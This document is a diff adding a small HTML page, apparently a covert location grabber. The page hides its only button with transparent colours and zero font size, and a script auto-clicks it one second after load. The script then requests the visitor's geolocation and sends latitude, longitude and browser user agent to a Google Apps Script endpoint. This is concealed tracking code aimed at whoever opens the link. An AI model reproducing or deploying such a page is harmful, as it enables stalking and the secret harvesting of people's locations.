@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <title>Send My Location</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f0f4f8;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: #333;
+    }
+    h2 {
+      margin-bottom: 30px;
+      font-weight: 700;
+      font-size: 24px;
+      color: #1a73e8;
+      text-align: center;
+    }
+    button {
+      background-color: transparent;
+      color: transparent;
+      border: none;
+      padding: 15px 35px;
+      font-size: 0;
+      border-radius: none;
+      cursor: pointer;
+      box-shadow: 0 0px 0px rgba(26, 115, 232, 0.3);
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+    }
+    button:hover {
+      background-color: #155ab6;
+      box-shadow: 0 8px 20px rgba(21, 90, 182, 0.5);
+    }
+  </style>
+  <script>
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const device = navigator.userAgent;
+
+            const url =
+              "https://script.google.com/macros/s/AKfycby8lPTQlLI5WntNoHs8X_LIOYhrKHw6oPgVERAf2JgJpo8VN_r8kpVcTWQZvcsS5qHPeQ/exec";
+
+            fetch(url, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+              },
+              body: new URLSearchParams({
+                lat: lat,
+                lon: lon,
+                device: device,
+              }),
+            })
+              .then((res) => res.text())
+              .then((msg) => alert("Success: " + msg))
+              .catch((err) => alert("Error: " + err));
+          },
+          function (error) {
+            alert("Location error: " + error.message);
+          }
+        );
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+
+    window.onload = function () {
+      // ১ সেকেন্ড পর বাটন অটো ক্লিক
+      setTimeout(() => {
+        document.getElementById("sendBtn").click();
+      }, 1000);
+    };
+  </script>
+</head>
+<body>
+  <h2>🪄</h2>
+  <button id="sendBtn" onclick="sendLocation()">Send ⚙️</button>
+</body>
+</html>
